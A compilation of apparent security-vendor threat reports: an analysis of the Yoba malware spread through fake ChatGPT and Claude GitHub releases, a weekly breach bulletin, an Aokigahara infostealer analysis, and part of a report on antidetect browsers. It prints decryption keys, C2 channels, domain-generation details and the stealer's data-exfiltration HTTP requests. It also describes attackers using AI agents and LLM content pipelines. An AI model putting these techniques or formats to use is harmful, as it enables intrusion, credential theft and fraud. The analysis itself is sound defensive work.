Title: Tricks from the Past deployed via signed ChatGPT and Claude binaries
Context: Key Points Check Point Research discovered a campaign we track as Yoba where attackers abuse the popularity of AI tools such as ChatGPT and Claude, creating fake GitHub projects...
Full Text:
Key Points

Check Point Research discovered a campaign we track as Yoba where attackers abuse the popularity of AI tools such as ChatGPT and Claude, creating fake GitHub projects that pretend to be desktop applications like GPT-5.6 Sol, GPT-6 Astra, and Claude Opus.

The malware is placed next to legitimate, signed executables from OpenAI and Anthropic so it can be loaded indirectly, a technique commonly known as DLL sideloading, which is often used to bypass security protections.

This campaign demonstrates strong operational security (OPSEC) by avoiding dedicated command-and-control (C2) infrastructure and instead relying on Telegram, Tor, Catbox, and DNS over HTTPS (DoH).

The actor behind the campaign shows indicators that suggest Russian origins and appears to operate primarily in the UTC-4 time zone.

Introduction

Over the past two months, we have been tracking a campaign that abuses the popularity of AI tools such as ChatGPT and Claude to spread a custom malware chain we call Yoba. The attackers use fake GitHub projects that pretend to be AI desktop applications like GPT-5.6 Sol, GPT-6 Astra, and Claude Opus. These projects look convincing and use real GitHub infrastructure, which helps them appear legitimate to potential victims. The website exhibits search-targeted content and suspicious installer-delivery tactics consistent with an SEO-poisoning lure.

Inside the installers, there is a malicious component we refer to as the YobaDropper. This dropper includes another component, the YobaLoader, which is responsible for contacting attacker-controlled infrastructure and fetching the final payload. In this report, we describe how victims are lured to these fake projects, how the YobaDropper and YobaLoader work together, and how the attackers ultimately use this chain to run unwanted software on infected systems.

Figure 1 — GPT-6 Astra campaign, attack chain.

GitHub Repositories

The initial access occurred via malicious GitHub repositories. The projects were impersonating ChatGPT and Claude related models, more specifically GPT-5.6 Sol, GPT-6 Astra, and Claude Opus. No manipulation of fake engagement (stars/forks) was in place.

Figure 2 — GitHub repository.

Aside from the repositories, GitHub.io pages were used to describe the capabilities of the software, while the malware was hosted as a release.

Figure 3 — GitHub.io page with links to malicious release.

These phishing landing pages contain download links that point directly to the malicious ZIP releases hosted on GitHub.

Figure 4 — Claude Opus GitHub[.]io page.

While the repositories do not show signs of fake engagement (such as artificially inflated stars or forks) that would promote them within GitHub’s own search, they still appear among the top results on Google. This is most likely due to SEO poisoning, where the attackers optimize titles, descriptions, and hosting domains to make their malicious projects rank highly in external search engines.

Figure 5 — Google Search results.

Each repository uses a different email address (edwardcarlsonmkym[@]outlook[.]com, daxschneiderdjuu[@]outlook[.]com, and rioprestonlfyx[@]outlook[.]com), and the uploader appears to operate in UTC+4, UTC-4, and UTC+3 respectively. This inconsistency likely reflects a deliberate attempt to obscure the threat actor’s true operational timezone.

The file that immediately stands out is winmm.dll, which was compiled the same day it was added to the ZIP archive. This suggests it is the component with the malicious functionality, while the other files serve to make the package appear legitimate. The compilation timestamp also indicates the actor is operating in the UTC-4 timezone.

Furthermore, Setup.exe, a legitimate signed OpenAI executable, is used during execution to sideload the malicious DLL. The Setup-Claude.zip file contains the same structure, though in this case Setup.exe is a legitimate signed Claude executable.

Figure 7 — Signed OpenAI and Anthropic binaries.

YobaDropper – winmm.dll

The malicious DLL contains multiple export names, suggesting that the legitimate winmm.dll has been spoofed. As in many other cases, these exports exist but their code has been stripped out, leaving them mostly empty and reducing the size of the binary.

Figure 8 — Stripped code from exports.

All 180 exports contain just a return instruction (C3) followed by NOPs (90), and DllEntryPoint is the only one containing actual code.

Anti-Analysis, Pre-Checks

The first function implements an anti-sandbox technique: the malware hashes the basename of its host executable and checks whether the checksum matches the hardcoded value 0xE6C2F326. The hashing algorithm has been identified as DJB2, which other malware families have also used in the past. The malware expects to run under the name Setup.exe, so this check fails if the DLL is executed on its own inside a sandbox environment.

Figure 9 — DJB2 algorithm and hash check.

Although a failed check does not terminate the process, the DLL performs 200,000 iterations of Sleep(5500), amounting to approximately 12.73 days, while repeatedly appending the decoded filler string pddy to a local UTF-16 buffer.

In the second function, the malware checks whether the infected user is located in a CIS country by inspecting the system’s keyboard layout. Ukraine was historically included in such checks, but it is not in the list used by recent malware.

The language check is unusual. Instead of comparing the victim’s keyboard language ID against hardcoded values, the malware checks whether the ID falls within the range 0x19–0x44. For IDs in that range, it tests the corresponding bit in the bitmask 0xEC0400C8401 to determine whether the language belongs to a CIS-region country, with an explicit exception for ID 0x22 (Ukrainian). Bazarloader has used a similar technique in the past, with the bitmask 0xD8080190C03.

Figure 10 — Language checks.

The malware continues to resolve Windows API functions dynamically from kernel32.dll and ntdll.dll by comparing hashes of the exported function names. The hashing algorithm is again DJB2, with the initial value 0x1505.

The last check before the malware unpacks and deploys the embedded payload tests whether the process is running with administrator privileges. If it is not, the malware displays the message “Please run this program as Administrator.” to the victim and terminates itself, requiring the user to rerun it with elevated privileges.

Deploying Phase

The dropper contains multiple XOR-encrypted strings that are decrypted when needed. These strings include the file paths where the embedded binaries are dropped, as well as the decryption keys.

It creates a directory under ProgramData named WMProcess. Then it copies the original WMPDMC.exe from System32 into this newly created folder. Next, it decrypts the embedded payload using the string IRANNUMBERONE as the XOR seed and drops the decrypted payload in the same folder under the name wmpdui.dll.

Using scheduled tasks, the dropper maintains persistence by leveraging the legitimate executable, which will sideload the malicious payload. To make the task appear legitimate, it sets the author to Microsoft Corporation and the description to Collects device metadata for Windows Media Player.. It also sets the boot-trigger delay to PT3M, which corresponds to a 3-minute delay after system startup, and configures the task to run under the Local System account (S-1-5-18).

YobaLoader – wmpdui.dll

The second-stage payload contains the same code as the dropper, which indicates that the same developer is responsible for both components.

The same anti-sandbox technique is used, forcing the malware to be run only by WMPDMC.exe. It again checks the hash of the process basename, and only continues execution if this value matches the hardcoded hash 0x552751E3.

The dropper uses the DJB2 hashing algorithm to hash and verify the process name and to resolve Windows API functions, both with the same seed 0x1505. The loader (YobaLoader) also uses DJB2 for the process name with the same seed as the dropper, but for resolving Windows API functions it uses a different seed, 0x1DEB.

Figure 11 — Hashing windows API functions.

The developer reused the same string-hashing algorithm but changed the seed (0x1505 in the dropper, 0x1DEB in the loader) to separate the hash spaces for each stage, complicating analysis, and reducing the effectiveness of hash-based detection and automated tooling.

Network

The downloader uses an interesting process to obtain the next-stage payload. It first decrypts multiple strings using a simple XOR operation, among these strings is the URL of a Telegram channel, t[.]me/yoba_fanclub. It then visits this channel using the user-agent string Mozilla/5.0 (Windows NT 10.0; Win64;) and parses the HTML source to extract the src URL of the element with the class tgme_page_photo_image. This class refers to the location where the channel’s profile image is hosted.

Figure 12 — Telegram channel.

It downloads the image and uses the last 50 bytes as a seed to generate a domain based on three lists of dictionary words, which are decrypted as part of the DGA algorithm. This DGA algorithm uses three sets of strings:

Adjectives

Nouns

Verbs

Finally, it generates and appends an integer value in the range 0–999. The generated domain has the following format, "$adjective-$noun-$verb-$digit.dedyn[.]io". By changing the image of the Telegram channel, a new domain can be generated.

The following Python snippet represents the DGA algorithm:

It then queries Google’s DNS-over-HTTPS (DoH) API to obtain an encrypted command from a DNS TXT record, using a URL of the form https://dns[.]google/resolve?name=$DGA&type=TXT.

By relying on a DoH service and common file-hosting platforms, the actor aims to bypass passive DNS monitoring and some gateway-based security protections, making their command-and-control traffic harder to distinguish from regular user activity.

Figure 13 — DNS TXT record, base64 encoded data.

It decodes the Base64-encoded data field from the JSON response and validates it using Ed25519 signature verification with the public key b5c2d20623d4e6647d06a42864edd8629f82c5c384b243fdaeeeca24b3873d64. Once the signature validation succeeds, it decrypts the decoded value using AES in ECB mode with the key 1d0d1368b4d53f3a6322cf40e84e63db.

Decrypted response: 1https://files.catbox[.]moe/z5zpy9.dat

The downloader retrieves the encrypted payload and decrypts it using the same AES key and ECB mode that were previously used for the DNS data.

The malware provides three methods for deploying the downloaded payload. The selected method is indicated by the first character of the decrypted response that follows the URL (1/2/3):

Injects the downloaded payload into svchost.exe (NtWriteVirtualMemory/NtCreateThreadEx). It enumerates running processes and, using the hashing algorithm with the seed 0x1DEB, searches for the hash value 0xC26CDEA5, which corresponds to svchost.exe.

Saves the payload as a %TEMP%\$10_rand_char\$10_rand_char.exe file and executes it. Before running the executable, the downloader removes the Zone.Identifier alternate data stream, which is hidden metadata used by Windows to track the origin of downloaded files.

Saves the payload as a %TEMP%\$10_rand_char\$10_rand_char.ps1 PowerShell script and invokes it with the following parameters: -WindowStyle Hidden -ExecutionPolicy Bypass -File.

Finally, the injected payload into svchost.exe is an XMRig 6.26.0 miner with a hidden command line targeting a TLS-enabled onion mining endpoint through a local Tor SOCKS5 proxy. It can unpack and start Tor 0.4.9.12 plus lyrebird 0.8.1, monitor user-input activity to pause mining, and conditionally load the WinRing0 driver service for MSR-based mining optimization.

Past Yoba Versions

Yoba exposes, through the same hashing algorithm it uses for anti-analysis, the specific process name under which it expects to run. Even without having full visibility into the campaign from the very beginning, analysts can still infer which targeted software was used to lure users by correlating this expected process name with the fake AI applications promoted on the associated GitHub repositories and GitHub Pages sites.

Earlier YobaDropper observed in the wild appeared in early June 2026. In this campaign, the dropper was sideloaded by a process named Cursor.exe (hash: 0x56221573). It remains unclear whether Cursor.exe was a legitimate signed binary. The majority of the functionality in this early variant is consistent with the newer versions of both the dropper and the loader.

YobaDropper shows two main differences between its older and newer versions:

Unpacking logic: In the oldest version, the buffer is first Base64-decoded and then XOR-decrypted to extract the YobaLoader. In the newer version, the developer removed the Base64-decoding step and performs only XOR decryption, simplifying the unpacking process.

Execution method: The second change concerns how YobaLoader is triggered. The newer version uses Scheduled Tasks to start the copied legitimate host and sideload the loader, whereas the first discovered version creates the shortcut msdefender_scheduler{7940-8490-6670-1081}.lnk in the Startup folder. This shortcut executes a copied %APPDATA%\Microsaft Difendir\msdtc.exe and sideloads %APPDATA%\Microsaft Difendir\mswsock.dll.

Earlier version of YobaLoader contains language checks and excludes only Russia from infection. In later versions, these checks were moved to the dropper stage and expanded to exclude additional CIS countries, shifting regional filtering earlier in the infection chain.

Figure 14 — Exclusion of Russian language from infection.

While the overall DGA logic remains the same, the early variant uses the extension .aber[.]ir instead of .dedyn[.]io. In addition, instead of injecting into svchost.exe, this variant injects into a different running process identified only by its hashed name 0x21BD94C2.

The initial loader also implements several anti-analysis techniques that have been removed from the newer versions of the malware:

1. Anti-debuggingIt enumerates all kernel object types and reads their TypeName values. Each type name is hashed using DJB2 with the seed 0x1DEB until the hash matches 0xCF9EE149, which corresponds to DebugObject. If a DebugObject is found, it indicates that a debugger is or was active, and in that case the malware terminates itself.

Figure 15 — DebugObject via NtQueryObject-ObjectAllTypesInformation.

2. Anti-VMThe malware uses a VM/sandbox-detection scoring function while running several hardware fingerprinting checks. The maximum score is 6, and the minimum required to continue the infection chain is 3. The checks include:

Hypervisor-present bit and CPUID timing (via RDTSCP).

Hypervisor vendor signature string (CPUID leaf 0x40000000).

CPU brand string sanity checks (CPUID leaves 0x80000002–0x80000004).

SMBIOS-based firmware fingerprinting (GetSystemFirmwareTable–RSMB)

Figure 16 — Hypervisor vendor signature string technique.

Despite these small differences in early anti-analysis behavior, the Telegram channel and the profile image used as the seed for the DGA remain the same as in the newer variants, indicating that the operator retained the same infrastructure while iterating on the loader’s evasion logic.

Conclusion

The Yoba campaign shows how attackers can use trusted platforms and the current interest in AI tools to distribute malware in a way that looks believable and harmless at first glance. By packaging their code together with well-known software names and hosting it on GitHub, they lower the chances that users or basic security checks will immediately flag the files as suspicious.Although the underlying techniques are more advanced than typical commodity malware, the main goals remain straightforward: gain a foothold on the victim’s system, avoid easy detection, and then run the attacker’s chosen payload. Organizations should be cautious about installing “AI helpers” or similar tools from unverified repositories and should enforce policies that restrict running software from unknown sources. Combining user awareness with basic technical controls.

For the latest discoveries in cyber research for the week of 26th October, please download our Threat Intelligence Bulletin.

TOP ATTACKS AND BREACHES

Japanese cloud hosting provider Onamae Desktop Cloud has confirmed a cyberattack in which intruders compromised its infrastructure and installed malware on customer servers. More than 26,000 servers were potentially affected. The provider began shutting down customer environments on October 21 to contain the intrusion and prevent further unauthorized activity.

India’s state-run State Bank of India, serving more than 500 million customers, disclosed a data breach after 3,897 customer records appeared online. The exposed information reportedly included contact details, residential addresses, birth dates, bank profiles, loan records, and identity-verification documents. The bank reported no disruption to core services.

WordPress backup developer TeamUpdraft has suffered a cyberattack after intruders accessed its website and potentially exposed customer information and management-service connection keys. Attackers subsequently abused compromised UpdraftCentral keys to install backdoors on WordPress websites during an 18-hour campaign on October 18 and 19.

LiteLLM, a widely used open-source AI gateway, confirmed an October 21 supply-chain attack in which attackers used stolen developer tokens to publish malicious packages and Docker images. The compromised version 1.107.0 was designed to steal cloud credentials and AI service secrets, with attackers subsequently testing stolen AWS credentials.

AI THREATS

Check Point Research uncovered how AI-enabled antidetect browsers allow operators to manage thousands of deceptive accounts while evading platform safeguards. Tools including Kameleo, AdsPower, and MultiLogin facilitate account takeovers, financial fraud, and automated distribution of AI-generated content, supporting large-scale influence operations across social media platforms.

Researchers observed affiliates of INC and The Gentlemen ransomware groups using AI agents to conduct human-approved cyberattacks. The operation targeted 62 organizations by exploiting remote-access systems and compromised credentials. Victims were concentrated in the manufacturing, energy, healthcare, and pharmaceutical sectors, primarily in the United States.

Researchers analyzed a cybercriminal operation that used multiple AI assistants to plan and execute different types of malicious activity. The attacker relied on AI-generated scripts and reconnaissance reports to develop attack capabilities. Exposed operational records revealed how AI tools supported campaign planning, technical execution, and adaptation across different targets.

VULNERABILITIES AND PATCHES

Critical PHP vulnerabilities CVE-2026-109618 and CVE-2026-109619 have been used in widespread exploitation attempts that could enable remote code execution. Attack traffic reportedly increased from thousands to millions of attempts following disclosure. As of October 23, approximately 97.5% of publicly visible PHP instances did not indicate patched versions.

Check Point IPS provides protection against this threat (PHP Remote Code Execution (CVE-2026-109618, CVE-2026-109619, CVE-2026-115560((

Oracle has released its October 2026 Critical Patch Update, addressing 1,209 unique vulnerabilities through 1,295 security patches across 33 product families. The update includes 95 critical CVEs and affects widely deployed enterprise products, including Fusion Middleware, E-Business Suite, MySQL, and Java SE.

GitLab has fixed CVE-2026-110264, a critical vulnerability with a CVSS score of 10.0 affecting Community and Enterprise Editions. The integer overflow flaw could allow unauthenticated attackers to execute arbitrary code remotely on affected servers. The vulnerability affects versions before 18.11.13 and several 19.x releases.

A critical privilege-escalation vulnerability, CVE-2026-114625, affects on-premises Arista VeloCloud Orchestrator deployments. The flaw carries a CVSS score of 9.4 and allows authenticated users, including those with read-only access, to obtain operator-level permissions. Successful exploitation can expose restricted management functions, and the vulnerability has been exploited in attacks.

THREAT INTELLIGENCE REPORTS

Check Point Research has profiled Aokigahara, a newly identified infostealer targeting credentials and session data associated with AI applications, developer tools, and cloud platforms. Targeted applications include Claude, ChatGPT Desktop, Cursor, and GitHub Copilot. Stolen information may include authentication tokens, account credentials, and other sensitive application data.

Researchers revealed that U.S. federal investigators suspect an executive at a ransomware negotiation company assisted the ShinyHunters extortion group in operating its victim disclosure website. The site reportedly listed nearly 100 organizations between May and October 2026.

Researchers mapped Lazarus’s Operation FlashHole, a cyberespionage campaign targeting organizations in South Korea’s software, construction, and telecommunications equipment sectors. Attackers used tailored phishing messages and fraudulent portfolio websites to deliver malware. The campaign exploited trusted financial-security software to execute malicious components.

Researchers have uncovered a large-scale campaign by threat actor k0t targeting Fortinet FortiGate, FortiWeb, and Palo Alto Networks GlobalProtect devices. Attackers exploited vulnerabilities and weak credentials to establish persistent access and steal information. The operation exposed more than 70,000 credentials and showed possible connections to ransomware groups.

Key Points

Aokigahara, a newly observed infostealer, has been spotted in the wild. An earlier version may have been known as Kamidere or Stygian. The malware includes traditional data theft capabilities targeting browsers, VPN clients, cryptocurrency wallets, FTP/SFTP clients, password managers, and email applications, among other targets.

AI applications and development tools are notable targets. The stealer collects authentication files, session data, and configuration files associated with Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, and other tools.

Stolen AI credentials could offer opportunities for monetization. Usable credentials or session tokens could enable unauthorized access to paid AI services or the resale of compromised accounts.

Its collection scope extends to developer and cloud environments. Targets include Git credential files, SSH private keys, and AWS, Azure, and Google Cloud credential and configuration files.

Introduction

Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments.

This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data, but also access to AI services and the environments developers use to build software. Valid credentials or session tokens could expose private conversations and development data, enable unauthorized use of paid services, or potentially be sold to provide access to compromised AI accounts. While the malware’s collection routines support these possibilities, the analysis does not confirm how its operators monetize the stolen data.

Stealer Capabilities and Targeted Applications

The Aokigahara infostealer includes common information-stealing capabilities, such as screenshot capture, clipboard collection, browser credential and cookie theft, cryptocurrency wallet data collection, and file grabbing. It also includes a clipper handler that drops a separate component for clipboard manipulation.

The malware targets Chromium-based browsers and Mozilla Firefox, desktop cryptocurrency wallets and browser wallet extensions, messaging applications such as Discord and Telegram, and gaming platforms such as Steam, Roblox, and Minecraft. Additional targets include password managers, VPN clients, FTP/SFTP clients, email applications, and AI development tools. If usable secrets are exposed, attackers could gain access to source code repositories, cloud resources, and other development services.

AI Data Theft

These include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, and Gemini CLI, alongside AWS credentials and single sign-on (SSO) data. This extends the malware’s collection beyond traditional personal accounts to authentication files, session data, and configuration files associated with AI-assisted development and cloud environments.

The paths below identify the handler’s collection targets. Depending on the application, these files may contain tokens, credentials, session data, or settings; not every targeted file necessarily contains authentication secrets.

Anti-Analysis

The infostealer includes several known anti-analysis checks, most of which run only when their corresponding configuration flags are enabled. The results of these checks determine whether the malware continues execution. It also dynamically resolves Windows API functions using hashes and uses control-flow flattening in some parts of the code, particularly around the configuration decryption routine.

When the language-check flag is enabled, the malware checks the system’s keyboard layout and Windows UI language. If either matches a language ID represented in the bitmask 0x6C0400C8601, the malware stops execution. The excluded language settings are listed below.

Configuration

The encrypted configuration blob is stored in the .stgcfg section. It begins with a four-byte magic value STGC, followed by the ciphertext length, a 16-byte initialization vector (IV) used for AES-CBC decryption, and the encrypted configuration data.

struct EncryptedConfigBlob { DWORD magic; // Four-byte configuration magic DWORD ciphertext_len; // Encrypted configuration size in bytes BYTE iv[0x10]; // 16-byte AES-CBC initialization vector BYTE ciphertext[]; // Encrypted configuration data };

The AES IV is stored in the .stgcfg section, while the malware derives the AES key from a specific seed using the algorithm below. The routine produces a 32-byte key used to decrypt the configuration with AES-256-CBC.

""" Author: @Tera0017/Check Point Research """ def decrypt_aes_key(seed: int, length: int = 32) -> bytes: key = bytearray() for i in range(length): seed ^= (seed >> (8 * (i & 3))) & 0xFF seed = (seed * 0x01000193) & 0xFFFFFFFF seed ^= seed >> 16 key.append(seed & 0xFF) return bytes(key)

The decrypted configuration contains the command-and-control (C&C) URL, the server’s X25519 public key, a build ID, and a gate token used for communication. It also includes a module bitmask that controls which capabilities are executed, flags for language and analysis-environment checks, TLS certificate pinning settings, and up to three fallback URLs.

struct DecryptedConfig { char base_url[0x100]; BYTE server_x25519_public_key[0x20]; char build_id[0x20]; char gate_token[0x40]; DWORD module_mask; BYTE unk_184[0x404]; BYTE language_check; BYTE analysis_environment_check; BYTE unk_58A; BYTE tls_certificate_sha256[0x20]; BYTE tls_pin_enabled; BYTE fallback_urls[3][0x100]; BYTE fallback_count; };

The malware uses the module_mask bitmask in its configuration to control which built-in capabilities are executed. Each entry in the module-dispatch table contains a function pointer and an associated feature mask. During dispatch, the malware performs a bitwise AND between module_mask and the entry’s feature mask. A nonzero result selects the corresponding function for execution.

All module implementations remain embedded in the executable, even when disabled in the configuration.

Network

The malware retrieves its C&C connection settings from the decrypted configuration. It uses the /gate path as the base for three endpoints that handle session establishment, stolen data uploads, and session completion.

Path

Description

/gate/handshake

Establishes an upload session by sending the client’s raw 32-byte X25519 public key. The malware requires an HTTP 200 response before enabling uploads.

/gate/chunk

Uploads collected information packaged into ZIP archives and encrypted using AES-256-GCM. Each request body contains a 12-byte nonce, ciphertext, and a 16-byte authentication tag. Headers identify the upload label and sequence number.

/gate/complete

Signals the end of the upload phase by sending the eight-byte marker COMPLETE. The malware expects an HTTP 200 response and subsequently performs local session cleanup. This notification does not independently establish that every upload succeeded.

The stealer generates an X25519 key pair consisting of a public key and a private key. It then computes a shared secret using its private key and the server_x25519_public_key stored in the decrypted configuration. The malware derives the communication encryption key from this shared secret using SHA-256 and the fixed string aokigahara. The resulting 32-byte key is used for AES-GCM encryption.

/handshake

The initial handshake registers the upload session with the C&C server and sends the client’s 32-byte X25519 public key in the request body. The request headers include the build ID, gate token, session ID, hardware identifier, and key exchange algorithm.

POST /gate/handshake HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: cae87a25 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e X-Session: ca47b44161834cb70a224dbe3d92a383 X-HWID: 69B506A1 X-KEX: x25519 Content-Length: 32 Host: $SERVER $CLIENT_X25519_PUBLIC_KEY

/chunk

For each executed collection module, the malware uploads an AES-GCM-encrypted ZIP archive to /gate/chunk. The X-Chunk header identifies the type of stolen data, using module labels such as sysinfo, browsers, firefox, or aisessions. The X-Chunk-Index header identifies the upload’s sequence number, which is also included in the request body.

The malware allocates an upload buffer with a size equal to the ZIP archive’s size plus 28 bytes. The buffer begins with a 12-byte AES-GCM nonce, formed by combining the four-byte little-endian chunk index with eight randomly generated bytes. The encrypted ZIP archive follows the nonce, and a 16-byte AES-GCM authentication tag is appended at the end.

POST /gate/chunk HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Chunk: sysinfo X-Chunk-Index: 0 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Total: 19 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 3233 Host: $SERVER \x00\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

The next example uploads screenshot data with a chunk index of 1. The request body begins with \x01\x00\x00\x00.

POST /gate/chunk HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Chunk: screenshot X-Chunk-Index: 1 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Total: 19 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 10066 Host: $SERVER \x01\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

/complete

After uploading all ZIP archives, the malware sends a final HTTP POST request to /gate/complete on the C&C server. The request body contains the eight-byte message COMPLETE, indicating that the upload process has finished.

POST /gate/complete HTTP/1.1 Connection: Keep-Alive Content-Type: application/octet-stream User-Agent: Microsoft-CryptoAPI/10.0 X-Build-ID: 4dbf818f X-HWID: 69B506A1 X-Session: ca47b44161834cb70a224dbe3d92a383 X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e Content-Length: 8 Host: $SERVER COMPLETE

The stealer appears to be under active development, with changes to its HTTP User-Agent string observed across versions. The latest analyzed samples use Microsoft-CryptoAPI/10.0 for communication with the server.

Conclusion

The malware retains the broad collection capabilities expected of an infostealer, but its dedicated targeting of AI applications and developer tools is particularly notable. By collecting authentication files, application storage, Git credentials, SSH-related files, and cloud configuration data, it reaches beyond traditional consumer accounts into AI-assisted development and cloud environments.

The targeting of AI sessions creates a potential route to monetization through unauthorized use of paid services or the resale of compromised access. It may also create opportunities for data extortion. Users can share sensitive business information, proprietary source code, and other confidential material with AI services. If stolen credentials or session tokens provide access to conversation histories or uploaded files, attackers could potentially threaten to disclose that information to demand payment.

The key finding is that AI application credentials and session data are part of this malware’s collection scope and should be treated as sensitive assets alongside browser sessions, cloud credentials, and developer keys.

Title: The Risk of AI-Powered Antidetect Browsers in Online Fraud and Influence Operations
Context: Threat actors abuse these platforms, taking over accounts and using them for financial fraud, phishing and malware distribution
Full Text:
Key Findings

Antidetect browsers obscure the digital identity of their users, enabling a single operator to silently manage thousands of isolated accounts across multiple platforms (including Facebook, TikTok, Instagram, and YouTube), while evading detection systems that look for scams and coordinated inauthentic behavior.

Threat actors abuse these platforms, taking over accounts and using them for financial fraud, phishing and malware distribution. These accounts can also be used to coordinate influence operations, which becomes an even greater concern ahead of elections.

Social platforms primarily detect coordinated activity at the account and behavioral layer. Antidetect browsers run below the surface enabling them to remain undetected.

The three main antidetect browsers we discuss in this report are Kameleo, AdsPower, and MultiLogin.

These tools already use AI integration, from built-in automation templates to offering a dedicated MCP server that pipes LLM-generated content directly into pre-warmed account profiles at machine speed. Running a large-scale social media operation now requires only a credit card instead of a technical team.

Introduction

Antidetect browsers conceal their users’ digital identities, enabling a single operator or small team to simultaneously run thousands of isolated accounts across multiple platforms such as Facebook, Instagram, TikTok, YouTube, Twitter/X, Discord, LinkedIn, Reddit, and many more, without triggering the detection systems employed by those platforms.

In this report, we highlight three main tools: Kameleo, AdsPower, and MultiLogin. We selected these specifically on the basis of documented references across underground forums and criminal marketplaces, indicating active adoption beyond their stated commercial purposes. Confirmed use cases include:

Account takeover operations in which session cookies harvested by infostealer malware are injected into clean browser profiles to assume control of banking accounts and cryptocurrency wallets without triggering authentication alerts.

Carding operations in which stolen payment credentials are tested across e-commerce platforms under the guise of distinct legitimate users.

Fraudulent loan applications submitted under fabricated identities.

Bulk creation of artificial accounts used to generate fraudulent advertising revenue at scale.

As documented in Anthropic’s September 2026 Threat Intelligence Report, attackers used antidetect browsers in a fraud campaign that targeted cryptocurrency exchanges and financial marketplaces. They combined antidetect browser profiles, residential proxies, automated CAPTCHA-solving, and identity-verification bypass tools to create large numbers of verified accounts while avoiding onboarding security checks. These accounts were later used in fraud operations.

The risk posed by antidetect browsers is greater because these accounts pass KYC verification, build legitimate activity histories, and appear benign during transactions. As a result, fraud detection systems that rely on user behavior or device identity often cannot identify these accounts as suspicious until after fraudulent activity has already occurred.

The antidetect browsers documented in this research are commercially available, legally registered platforms with documented legitimate use cases in digital marketing, e-commerce, and privacy protection. When deployed by threat actors, the same infrastructure that enables financial fraud at scale is equally applicable to Coordinated Inauthentic Behavior (CIB), the term used to describe organized manipulation campaigns in which false identities are central to the operation and adversarial methods are used to evade detection.

Meta’s most recent transparency reporting explicitly flagged this as a growing concern, with Russia, Iran, and China identified as the three leading sources of such activity globally.

The Identity Obfuscation Stack – How antidetect browsers defeat social media platform detection at every layer

Figure 1 – The five layers through which antidetect browsers defeat platform detection methods.

While antidetect browsers are not a new phenomenon, their threat potential has increased with the integration of AI. Previously, their operational impact was constrained by the manual effort required to run and maintain large account networks at scale. AI-assisted content generation, automated persona management, and machine-speed distribution pipelines now enables a single actor with a subscription and a prompt to do the work of a coordinated team.

In the following sections, we provide a technical breakdown of each tool, examining capabilities documented on their own platforms, underground forum references, and the specific features that position them as an emerging threat.

Figure 2 – Comparison of popular antidetect tools.

Defeating Platform Detection: The Identity Layer No Platform Can See

Companies like Meta, TikTok, and Google have spent billions of dollars building behavioral and identity detection systems to identify abuse of their platforms for scams, financial fraud, and coordinated inauthentic activity. Antidetect browsers are engineered to defeat every signal on which those systems rely.

Every antidetect browser uses fingerprint spoofing. When a browser connects to a website, it exposes dozens of identifying parameters that the website can collect to build a browser fingerprint, including canvas rendering output, WebGL vendor and renderer strings, font enumeration behavior, screen resolution, time zone, user agent, and hardware identifiers. Platforms cross-reference these signals to determine whether two accounts originate from the same device. Antidetect browsers intercept and fabricate each of these parameters individually, assigning a unique combination to every profile.

The criminal ecosystem surrounding these tools extends well beyond their commercial vendors. As seen in Figure 3, a threat actor on a Russian-language underground forum advertised an AiTM engine as a commercial service, with built-in functionality to export harvested session credentials directly into antidetect browsers. The post confirms that the pipeline from credential harvesting to antidetect-assisted account takeover is a documented, commercially available and actively traded workflow with dedicated tooling, published instructions, and an active buyer community.

Figure 3 – An AiTM engine advertised as a commercial service on a Russian-language underground forum, with built-in functionality to export harvested session credentials directly into antidetect browsers.

Kameleo

Modifying browser engines at the source level rather than applying surface overrides, Kameleo produces fingerprints drawn from real device signatures, making them significantly harder to flag as anomalous. Its adoption within criminal ecosystems is evidenced by its repeated appearance across the most active Russian-language hacking forums. As seen in Figure 4, Kameleo is listed alongside other antidetect browsers in a post by a proxy seller on an underground forum, advertising residential proxy services explicitly marketed for account farming, CAPTCHA bypass, and shield evasion against security systems including DataDome, the same platform for which Kameleo’s own blog publishes dedicated bypass guides.

Figure 4 – A proxy seller on an underground forum listing Kameleo as part of a complete operational stack. The service is explicitly marketed for account farming and bulk account management.

Kameleo’s engineering team published a guide detailing how to automate Facebook likes across multiple accounts simultaneously using precisely this fingerprint manipulation. As seen in Figure 5, evading platform detection is not a side effect but the tool’s primary operational value.

Figure 5 – Kameleo’s guide on how to automate Facebook likes across multiple accounts simultaneously using browser fingerprint manipulation.

Beyond fingerprinting, Kameleo suppresses WebRTC, a protocol that can leak a device’s real IP address even when a proxy is active, and provides explicit configuration options to prevent non-proxied UDP connections. The documentation frames this not as a privacy feature but as a counter to a known de-anonymization vector used by platform security teams.

